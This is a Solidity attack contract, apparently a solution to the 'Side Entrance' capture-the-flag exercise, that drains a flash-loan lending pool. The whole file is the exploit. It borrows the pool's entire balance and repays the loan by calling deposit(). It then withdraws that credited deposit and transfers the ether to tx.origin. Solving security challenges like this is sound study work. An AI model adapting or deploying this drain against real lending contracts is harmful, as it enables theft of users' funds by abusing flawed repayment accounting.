// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack {
    ISideEntranceLenderPool public pool;
    bytes public result;

    constructor (ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        
        pool.withdraw();
        payable(tx.origin).transfer(address(this).balance);
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}